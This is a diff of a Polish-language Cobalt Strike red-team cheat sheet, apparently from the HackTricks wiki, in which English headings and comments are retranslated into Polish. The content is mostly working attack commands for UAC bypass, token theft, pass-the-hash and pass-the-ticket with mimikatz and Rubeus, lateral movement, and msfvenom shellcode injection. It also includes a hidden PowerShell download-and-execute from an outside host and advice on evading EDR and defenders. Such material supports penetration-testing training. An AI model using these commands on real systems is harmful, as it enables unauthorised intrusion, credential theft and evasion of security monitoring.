@@ -1,5 +1,7 @@
 # Cobalt Strike
 
+{{#include /banners/hacktricks-training.md}}
+
 ### Listeners
 
 ### C2 Listeners
@@ -15,9 +17,9 @@ Beacony tych listenerów nie muszą komunikować się bezpośrednio z C2, mogą 
 * **Beacon TCP ustawi listener na wybranym porcie**. Aby połączyć się z beaconem TCP, użyj polecenia `connect <ip> <port>` z innego beacona.
 * **Beacon smb będzie nasłuchiwać na pipename o wybranej nazwie**. Aby połączyć się z beaconem SMB, musisz użyć polecenia `link [target] [pipe]`.
 
-### Generate & Host payloads
+### Generowanie i hostowanie payloadów
 
-#### Generate payloads in files
+#### Generowanie payloadów w plikach
 
 `Attacks -> Packages ->`
 
@@ -26,15 +28,15 @@ Beacony tych listenerów nie muszą komunikować się bezpośrednio z C2, mogą 
 * **`Windows Executable`** dla .exe, .dll lub usługi .exe
 * **`Windows Executable (S)`** dla **stageless** .exe, .dll lub usługi .exe (lepsze stageless niż staged, mniej IoCs)
 
-#### Generate & Host payloads
+#### Generowanie i hostowanie payloadów
 
 `Attacks -> Web Drive-by -> Scripted Web Delivery (S)` To wygeneruje skrypt/wykonywalny do pobrania beacona z Cobalt Strike w formatach takich jak: bitsadmin, exe, powershell i python.
 
-#### Host Payloads
+#### Hostowanie payloadów
 
 Jeśli już masz plik, który chcesz hostować na serwerze www, po prostu przejdź do `Attacks -> Web Drive-by -> Host File` i wybierz plik do hostowania oraz konfigurację serwera www.
 
-### Beacon Options
+### Opcje Beacona
 
 <pre class="language-bash"><code class="lang-bash"># Wykonaj lokalny plik .NET
 execute-assembly </path/to/executable.exe>
@@ -63,45 +65,45 @@ powerpick <cmdlet> <args> # To tworzy ofiarny proces określony przez spawnto i 
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # To wstrzykuje UnmanagedPowerShell do określonego procesu, aby uruchomić cmdlet PowerShell.
 
-# Użytkownik impersonation
-## Generowanie tokenów z poświadczeniami
-make_token [DOMAIN\user] [password] #Utwórz token, aby impersonować użytkownika w sieci
-ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ w komputerze
-rev2self # Zatrzymaj używanie tokena wygenerowanego za pomocą make_token
+# Uwierzytelnianie użytkownika
+## Generowanie tokenów z danymi uwierzytelniającymi
+make_token [DOMAIN\user] [password] # Utwórz token, aby udawać użytkownika w sieci
+ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ na komputerze
+rev2self # Przestań używać tokena wygenerowanego za pomocą make_token
 ## Użycie make_token generuje zdarzenie 4624: Konto zostało pomyślnie zalogowane. To zdarzenie jest bardzo powszechne w domenie Windows, ale można je zawęzić, filtrując według typu logowania. Jak wspomniano powyżej, używa LOGON32_LOGON_NEW_CREDENTIALS, który jest typem 9.
 
-# UAC Bypass
+# Ominięcie UAC
 elevate svc-exe <listener>
 elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## Kradnij token z pid
-## Jak make_token, ale kradnąc token z procesu
+## Kradzież tokena z pid
+## Jak make_token, ale kradnie token z procesu
 steal_token [pid] # Ponadto, to jest przydatne do działań sieciowych, a nie lokalnych
-## Z dokumentacji API wiemy, że ten typ logowania "pozwala wywołującemu sklonować swój obecny token". Dlatego wyjście Beacon mówi Impersonated <current_username> - impersonuje nasz własny sklonowany token.
-ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ w komputerze
-rev2self # Zatrzymaj używanie tokena z steal_token
+## Z dokumentacji API wiemy, że ten typ logowania "pozwala wywołującemu sklonować swój obecny token". Dlatego wyjście Beacona mówi Impersonated <current_username> - udaje nasz własny sklonowany token.
+ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ na komputerze
+rev2self # Przestań używać tokena z steal_token
 
-## Uruchom proces z nowymi poświadczeniami
-spawnas [domain\username] [password] [listener] #Zrób to z katalogu z dostępem do odczytu, np. cd C:\
-## Jak make_token, to wygeneruje zdarzenie Windows 4624: Konto zostało pomyślnie zalogowane, ale z typem logowania 2 (LOGON32_LOGON_INTERACTIVE). Zawiera szczegóły dotyczące użytkownika wywołującego (TargetUserName) i użytkownika impersonowanego (TargetOutboundUserName).
+## Uruchom proces z nowymi danymi uwierzytelniającymi
+spawnas [domain\username] [password] [listener] # Zrób to z katalogu z dostępem do odczytu, np.: cd C:\
+## Jak make_token, to wygeneruje zdarzenie Windows 4624: Konto zostało pomyślnie zalogowane, ale z typem logowania 2 (LOGON32_LOGON_INTERACTIVE). Będzie szczegółowo opisywać użytkownika wywołującego (TargetUserName) i udawanego użytkownika (TargetOutboundUserName).
 
 ## Wstrzyknij do procesu
 inject [pid] [x64|x86] [listener]
 ## Z punktu widzenia OpSec: Nie wykonuj wstrzykiwania międzyplatformowego, chyba że naprawdę musisz (np. x86 -> x64 lub x64 -> x86).
 
-## Pass the hash
+## Przekaż hash
 ## Ten proces modyfikacji wymaga patchowania pamięci LSASS, co jest działaniem wysokiego ryzyka, wymaga lokalnych uprawnień administratora i nie jest zbyt wykonalne, jeśli włączony jest Protected Process Light (PPL).
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
-## Pass the hash przez mimikatz
+## Przekaż hash przez mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Bez /run, mimikatz uruchamia cmd.exe, jeśli działasz jako użytkownik z pulpitem, zobaczy powłokę (jeśli działasz jako SYSTEM, jesteś w porządku)
-steal_token <pid> #Kradnij token z procesu utworzonego przez mimikatz
+## Bez /run, mimikatz uruchomi cmd.exe, jeśli działasz jako użytkownik z pulpitem, zobaczy powłokę (jeśli działasz jako SYSTEM, jesteś w porządku)
+steal_token <pid> # Kradnij token z procesu utworzonego przez mimikatz
 
-## Pass the ticket
-## Żądaj biletu
+## Przekaż bilet
+## Poproś o bilet
 execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Utwórz nową sesję logowania do użycia z nowym biletem (aby nie nadpisać skompromitowanego)
@@ -110,13 +112,13 @@ make_token <domain>\<username> DummyPass
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
-## Pass the ticket z SYSTEM
+## Przekaż bilet z SYSTEM
 ## Wygeneruj nowy proces z biletem
 execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
 ## Kradnij token z tego procesu
 steal_token <pid>
 
-## Wyciągnij bilet + Pass the ticket
+## Ekstrakcja biletu + Przekaż bilet
 ### Lista biletów
 execute-assembly C:\path\Rubeus.exe triage
 ### Zrzut interesującego biletu według luid
@@ -128,28 +130,28 @@ execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket.
 ### Na koniec, ukradnij token z tego nowego procesu
 steal_token <pid>
 
-# Lateral Movement
+# Ruch lateralny
 ## Jeśli token został utworzony, zostanie użyty
 jump [method] [target] [listener]
 ## Metody:
 ## psexec                    x86   Użyj usługi do uruchomienia artefaktu Service EXE
 ## psexec64                  x64   Użyj usługi do uruchomienia artefaktu Service EXE
-## psexec_psh                x86   Użyj usługi do uruchomienia jednego wiersza PowerShell
-## winrm                     x86   Uruchom skrypt PowerShell przez WinRM
-## winrm64                   x64   Uruchom skrypt PowerShell przez WinRM
-## wmi_msbuild               x64   wmi lateral movement z msbuild inline c# task (oppsec)
+## psexec_psh                x86   Użyj usługi do uruchomienia jednego wiersza PowerShell
+## winrm                     x86   Uruchom skrypt PowerShell przez WinRM
+## winrm64                   x64   Uruchom skrypt PowerShell przez WinRM
+## wmi_msbuild               x64   ruch lateralny wmi z wbudowanym zadaniem c# (oppsec)
 
 remote-exec [method] [target] [command] # remote-exec nie zwraca wyjścia
 ## Metody:
-## psexec                          Zdalne wykonanie przez Menedżera Kontroli Usług
-## winrm                           Zdalne wykonanie przez WinRM (PowerShell)
-## wmi                             Zdalne wykonanie przez WMI
+## psexec                          Zdalne wykonanie przez Menedżera Kontroli Usług
+## winrm                           Zdalne wykonanie przez WinRM (PowerShell)
+## wmi                             Zdalne wykonanie przez WMI
 
-## Aby wykonać beacona za pomocą wmi (nie jest to w poleceniu jump), po prostu prześlij beacona i uruchom go
+## Aby wykonać beacona za pomocą wmi (nie jest to w poleceniu jump), po prostu załaduj beacona i uruchom go
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
-# Pass session to Metasploit - Through listener
+# Przekaż sesję do Metasploit - Przez listener
 ## Na hoście metaploit
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
@@ -161,31 +163,31 @@ msf6 exploit(multi/handler) > exploit -j
 beacon> spawn metasploit
 ## Możesz uruchomić tylko sesje x86 Meterpreter z obcym listenerem.
 
-# Pass session to Metasploit - Through shellcode injection
+# Przekaż sesję do Metasploit - Przez wstrzykiwanie shellcode
 ## Na hoście metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Uruchom msfvenom i przygotuj listener multi/handler
 
-## Skopiuj plik bin do hosta Cobalt Strike
+## Skopiuj plik binarny na hosta Cobalt Strike
 ps
-shinject <pid> x64 C:\Payloads\msf.bin #Wstrzyknij shellcode metasploit do procesu x64
+shinject <pid> x64 C:\Payloads\msf.bin # Wstrzyknij shellcode metasploit do procesu x64
 
-# Pass metasploit session to cobalt strike
+# Przekaż sesję metasploit do Cobalt Strike
 ## Wygeneruj stageless Beacon shellcode, przejdź do Attacks > Packages > Windows Executable (S), wybierz pożądany listener, wybierz Raw jako typ wyjścia i wybierz Użyj x64 payload.
 ## Użyj post/windows/manage/shellcode_inject w metasploit, aby wstrzyknąć wygenerowany shellcode Cobalt Strike.
 
 # Pivoting
-## Otwórz proxy socks w teamserver
+## Otwórz proxy socks na serwerze zespołowym
 beacon> socks 1080
 
-# SSH connection
+# Połączenie SSH
 beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ## Opsec
 
-### Execute-Assembly
+### Execute-Assembly
 
-**`execute-assembly`** używa **ofiarnych procesów** przy użyciu zdalnego wstrzykiwania procesów do wykonania wskazanego programu. To jest bardzo głośne, ponieważ do wstrzykiwania do procesu używane są pewne Win API, które każdy EDR sprawdza. Jednak istnieją pewne niestandardowe narzędzia, które można wykorzystać do załadowania czegoś w tym samym procesie:
+**`execute-assembly`** używa **ofiarnych procesów** zdalnego wstrzykiwania procesów do wykonania wskazanego programu. To jest bardzo głośne, ponieważ do wstrzykiwania do procesu używane są pewne API Win, które każdy EDR sprawdza. Jednak istnieją pewne niestandardowe narzędzia, które można wykorzystać do załadowania czegoś w tym samym procesie:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
@@ -194,30 +196,30 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 Skrypt agresora `https://github.com/outflanknl/HelpColor` utworzy polecenie `helpx` w Cobalt Strike, które doda kolory do poleceń, wskazując, czy są to BOF (zielony), czy są to Frok&Run (żółty) i podobne, lub czy są to ProcessExecution, wstrzykiwanie lub podobne (czerwony). Co pomaga wiedzieć, które polecenia są bardziej dyskretne.
 
-### Act as the user
+### Działaj jako użytkownik
 
 Możesz sprawdzić zdarzenia takie jak `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:
 
-- Zdarzenie zabezpieczeń EID 4624 - Sprawdź wszystkie interaktywne logowania, aby poznać zwykłe godziny pracy.
-- Zdarzenie systemowe EID 12,13 - Sprawdź częstotliwość wyłączeń/uruchomień/uśpienia.
-- Zdarzenie zabezpieczeń EID 4624/4625 - Sprawdź przychodzące ważne/nieprawidłowe próby NTLM.
-- Zdarzenie zabezpieczeń EID 4648 - To zdarzenie jest tworzone, gdy używane są poświadczenia w postaci czystego tekstu do logowania. Jeśli proces je wygenerował, binarny potencjalnie ma poświadczenia w czystym tekście w pliku konfiguracyjnym lub w kodzie.
+- EID zabezpieczeń 4624 - Sprawdź wszystkie interaktywne logowania, aby poznać zwykłe godziny pracy.
+- EID systemu 12,13 - Sprawdź częstotliwość wyłączeń/uruchomień/uśpienia.
+- EID zabezpieczeń 4624/4625 - Sprawdź przychodzące ważne/nieprawidłowe próby NTLM.
+- EID zabezpieczeń 4648 - To zdarzenie jest tworzone, gdy używane są dane uwierzytelniające w postaci czystego tekstu do logowania. Jeśli proces je wygenerował, binarny potencjalnie ma dane uwierzytelniające w czystym tekście w pliku konfiguracyjnym lub w kodzie.
 
 Kiedy używasz `jump` z Cobalt Strike, lepiej jest użyć metody `wmi_msbuild`, aby nowy proces wyglądał bardziej legitnie.
 
-### Use computer accounts
+### Użyj kont komputerowych
 
-To powszechne, że obrońcy sprawdzają dziwne zachowania generowane przez użytkowników i **wykluczają konta usług i konta komputerów, takie jak `*$`, z ich monitorowania**. Możesz używać tych kont do wykonywania ruchów bocznych lub eskalacji uprawnień.
+Często obrońcy sprawdzają dziwne zachowania generowane przez użytkowników i **wykluczają konta usług i konta komputerowe, takie jak `*$` z ich monitorowania**. Możesz użyć tych kont do przeprowadzania ruchu lateralnego lub eskalacji uprawnień.
 
-### Use stageless payloads
+### Użyj payloadów stageless
 
 Payloady stageless są mniej hałaśliwe niż staged, ponieważ nie muszą pobierać drugiego etapu z serwera C2. Oznacza to, że nie generują żadnego ruchu sieciowego po początkowym połączeniu, co sprawia, że są mniej prawdopodobne do wykrycia przez obrony oparte na sieci.
 
-### Tokens & Token Store
+### Tokeny i magazyn tokenów
 
 Bądź ostrożny, gdy kradniesz lub generujesz tokeny, ponieważ może być możliwe, aby EDR wyliczył wszystkie tokeny wszystkich wątków i znalazł **token należący do innego użytkownika** lub nawet SYSTEM w procesie.
 
-To pozwala na przechowywanie tokenów **na beacona**, więc nie ma potrzeby kradnięcia tego samego tokena w kółko. To jest przydatne do ruchów bocznych lub gdy musisz użyć skradzionego tokena wiele razy:
+To pozwala na przechowywanie tokenów **na beaconie**, więc nie ma potrzeby kradnięcia tego samego tokena w kółko. To jest przydatne do ruchu lateralnego lub gdy musisz użyć skradzionego tokena wiele razy:
 
 - token-store steal <pid>
 - token-store steal-and-use <pid>
@@ -226,19 +228,19 @@ To pozwala na przechowywanie tokenów **na beacona**, więc nie ma potrzeby krad
 - token-store remove <id>
 - token-store remove-all
 
-Podczas ruchu bocznego zazwyczaj lepiej jest **ukraść token niż generować nowy** lub przeprowadzać atak pass the hash.
+Podczas ruchu lateralnego zazwyczaj lepiej jest **ukraść token niż generować nowy** lub przeprowadzać atak pass the hash.
 
 ### Guardrails
 
-Cobalt Strike ma funkcję o nazwie **Guardrails**, która pomaga zapobiegać używaniu niektórych poleceń lub działań, które mogą być wykryte przez obrońców. Guardrails mogą być skonfigurowane do blokowania konkretnych poleceń, takich jak `make_token`, `jump`, `remote-exec` i innych, które są powszechnie używane do ruchu bocznego lub eskalacji uprawnień.
+Cobalt Strike ma funkcję o nazwie **Guardrails**, która pomaga zapobiegać używaniu niektórych poleceń lub działań, które mogą być wykryte przez obrońców. Guardrails mogą być skonfigurowane do blokowania konkretnych poleceń, takich jak `make_token`, `jump`, `remote-exec` i innych, które są powszechnie używane do ruchu lateralnego lub eskalacji uprawnień.
 
 Ponadto repozytorium [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) zawiera również kilka kontroli i pomysłów, które możesz rozważyć przed wykonaniem payloadu.
 
-### Tickets encryption
+### Szyfrowanie biletów
 
-W AD bądź ostrożny z szyfrowaniem biletów. Domyślnie niektóre narzędzia będą używać szyfrowania RC4 dla biletów Kerberos, które jest mniej bezpieczne niż szyfrowanie AES, a domyślnie aktualne środowiska będą używać AES. To może być wykryte przez obrońców, którzy monitorują słabe algorytmy szyfrowania.
+W AD bądź ostrożny z szyfrowaniem biletów. Domyślnie niektóre narzędzia będą używać szyfrowania RC4 dla biletów Kerberos, które jest mniej bezpieczne niż szyfrowanie AES, a domyślnie aktualne środowiska będą używać AES. Może to być wykryte przez obrońców, którzy monitorują słabe algorytmy szyfrowania.
 
-### Avoid Defaults
+### Unikaj domyślnych ustawień
 
 Kiedy używasz Cobalt Strike, domyślnie rury SMB będą miały nazwę `msagent_####` i `"status_####`. Zmień te nazwy. Możliwe jest sprawdzenie nazw istniejących rur z Cobalt Strike za pomocą polecenia: `ls \\.\pipe\`
 
@@ -253,20 +255,20 @@ W profilach Cobalt Strike możesz również modyfikować takie rzeczy jak:
 - Jak działa "fork and run" w bloku `post-ex {…}`
 - Czas snu
 - Maksymalny rozmiar binarnych do załadowania w pamięci
-- Ślad pamięci i zawartość DLL z bloku `stage {...}`
+- Ślad pamięci i zawartość DLL z blokiem `stage {...}`
 - Ruch sieciowy
 
-### Bypass memory scanning
+### Ominięcie skanowania pamięci
 
-Niektóre EDR-y skanują pamięć w poszukiwaniu znanych sygnatur złośliwego oprogramowania. Cobalt Strike pozwala na modyfikację funkcji `sleep_mask` jako BOF, która będzie w stanie zaszyfrować w pamięci backdoor.
+Niektóre EDR-y skanują pamięć w poszukiwaniu znanych sygnatur złośliwego oprogramowania. Cobalt Strike pozwala na modyfikację funkcji `sleep_mask` jako BOF, która będzie w stanie zaszyfrować w pamięci backdoora.
 
-### Noisy proc injections
+### Hałaśliwe wstrzykiwania procesów
 
-Kiedy wstrzykujesz kod do procesu, zazwyczaj jest to bardzo hałaśliwe, ponieważ **żaden regularny proces zazwyczaj nie wykonuje tej akcji, a sposoby na to są bardzo ograniczone**. Dlatego może to być wykryte przez systemy detekcji oparte na zachowaniu. Ponadto może być również wykryte przez EDR-y skanujące sieć w poszukiwaniu **wątków zawierających kod, który nie jest na dysku** (chociaż procesy takie jak przeglądarki używające JIT mają to powszechnie). Przykład: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+Podczas wstrzykiwania kodu do procesu zazwyczaj jest to bardzo hałaśliwe, ponieważ **żaden regularny proces zazwyczaj nie wykonuje tej akcji, a sposoby na to są bardzo ograniczone**. Dlatego może to być wykryte przez systemy detekcji oparte na zachowaniu. Ponadto może być również wykryte przez EDR-y skanujące sieć w poszukiwaniu **wątków zawierających kod, który nie znajduje się na dysku** (chociaż procesy takie jak przeglądarki używające JIT mają to powszechnie). Przykład: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
-### Spawnas | PID and PPID relationships
+### Spawnas | Relacje PID i PPID
 
-Podczas uruchamiania nowego procesu ważne jest, aby **utrzymać regularny związek rodzic-dziecko** między procesami, aby uniknąć wykrycia. Jeśli svchost.exec wykonuje iexplorer.exe, będzie to wyglądać podejrzanie, ponieważ svchost.exe nie jest rodzicem iexplorer.exe w normalnym środowisku Windows.
+Podczas uruchamiania nowego procesu ważne jest, aby **utrzymać regularną relację rodzic-dziecko** między procesami, aby uniknąć wykrycia. Jeśli svchost.exec wykonuje iexplorer.exe, będzie to wyglądać podejrzanie, ponieważ svchost.exe nie jest rodzicem iexplorer.exe w normalnym środowisku Windows.
 
 Kiedy nowy beacon jest uruchamiany w Cobalt Strike, domyślnie tworzony jest proces używający **`rundll32.exe`**, aby uruchomić nowego listenera. To nie jest zbyt dyskretne i może być łatwo wykryte przez EDR-y. Ponadto `rundll32.exe` jest uruchamiane bez żadnych argumentów, co czyni to jeszcze bardziej podejrzanym.
 
@@ -278,9 +280,9 @@ Możesz również zmienić to ustawienie **`spawnto_x86` i `spawnto_x64`** w pro
 
 ### Proxying attackers traffic
 
-Atakujący czasami będą musieli być w stanie uruchomić narzędzia lokalnie, nawet na maszynach z systemem Linux, i sprawić, by ruch ofiar dotarł do narzędzia (np. NTLM relay).
+Atakujący czasami będą musieli być w stanie uruchomić narzędzia lokalnie, nawet na maszynach z systemem Linux, i sprawić, aby ruch ofiar dotarł do narzędzia (np. NTLM relay).
 
-Ponadto, czasami, aby przeprowadzić atak pass-the-hash lub pass-the-ticket, jest to bardziej dyskretne dla atakującego, aby **dodać ten hash lub bilet do swojego lokalnego procesu LSASS** i następnie pivotować z niego, zamiast modyfikować proces LSASS maszyny ofiary.
+Co więcej, czasami, aby przeprowadzić atak pass-the-hash lub pass-the-ticket, jest to bardziej dyskretne dla atakującego, aby **dodać ten hash lub bilet do swojego własnego procesu LSASS** lokalnie, a następnie pivotować z niego, zamiast modyfikować proces LSASS maszyny ofiary.
 
 Jednak musisz być **ostrożny z generowanym ruchem**, ponieważ możesz wysyłać nietypowy ruch (kerberos?) z procesu swojego backdoora. W tym celu możesz pivotować do procesu przeglądarki (chociaż możesz zostać złapany na wstrzykiwaniu się do procesu, więc pomyśl o dyskretnym sposobie, aby to zrobić).
 ```bash
@@ -356,3 +358,6 @@ cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\Resou
 cd  C:\Tools\cobaltstrike\ArtifactKit  
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
+
+
+{{#include /banners/hacktricks-training.md}}
